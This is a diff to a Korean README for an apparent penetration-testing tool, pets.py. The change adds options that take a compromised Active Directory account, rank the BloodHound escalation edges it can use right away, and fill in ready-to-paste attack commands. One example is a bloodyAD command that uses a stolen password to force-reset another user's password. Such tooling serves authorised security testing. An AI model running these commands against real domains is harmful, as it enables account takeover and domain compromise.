@@ -51,6 +51,9 @@ python3 pets.py wes_out.txt
 |------|------|
 | `--ad` | **AD 모드**: BloodHound(bloodhound-python) JSON 을 분석해 권한상승 엣지 → 도구 추천 |
 | `--json-path DIR` | `[--ad 필수]` bloodhound-python JSON 들이 있는 디렉터리(또는 단일 파일) |
+| `--owned ACCT` | `[--ad]` 장악한 계정(들). `user` 또는 `user:pass`, 콤마 구분. 즉시 악용 가능한 엣지 강조 + 명령 치환 |
+| `--dc HOST` | `[--ad]` 예시 명령에 넣을 DC 호스트명 (기본: `dc01`) |
+| `--domain DOM` | `[--ad]` 예시 명령에 넣을 도메인 (기본: 데이터에서 자동 감지) |
 | `--show-all` | 도구가 매핑되지 않은 CVE 도 전부 표시 |
 | `--json FILE` | 결과를 JSON 으로 저장 (자동화/연동용, wes·AD 모드 공통) |
 | `--db PATH` | CVE 지식베이스 경로 지정 (기본: 스크립트 옆 `exploit_db.json`) |
@@ -85,6 +88,31 @@ python3 pets.py --ad --json-path ./
 
 # 예제 데이터로 확인
 python3 pets.py --ad --json-path examples/bloodhound_sample
+```
+
+### 장악 계정 지정 (`--owned`)
+
+내가 이미 손에 넣은 계정을 지정하면, **그 계정(및 소속 그룹, `Domain Users` 같은 저권한 그룹)이
+지금 바로 악용할 수 있는 엣지를 최상위로 끌어올려 `★ 즉시 실행 가능`** 으로 강조한다.
+동시에 예시 명령의 도메인·계정·DC 를 실제 값으로 치환해 바로 복붙할 수 있게 한다.
+
+```bash
+# 비번까지 주면 명령에 그대로 치환됨 (user:pass)
+python3 pets.py --ad --json-path ./ --owned 'jdoe:Summer2026!' --dc dc01.corp.local
+
+# 여러 계정 지정 가능 (콤마 구분)
+python3 pets.py --ad --json-path ./ --owned 'jdoe,svc_sql'
+```
+
+출력 예 (`--owned 'jdoe:Summer2026!'`):
+
+```
+[OWNED] 소유 계정: jdoe  ->  지금 바로 악용 가능: 2종 2건
+
+● ForceChangePassword (1건)  ... [★ 즉시 실행 가능] [저권한 주체]
+    DOMAIN USERS@CORP.LOCAL --ForceChangePassword--> SVC_BACKUP@CORP.LOCAL [user] ★OWNED
+    ▸ 대상이 사용자
+      $ bloodyAD -u jdoe -p 'Summer2026!' -d corp.local --host dc01.corp.local set password TARGETUSER 'NewPass123!'
 ```
 
 **탐지/추천하는 것:**
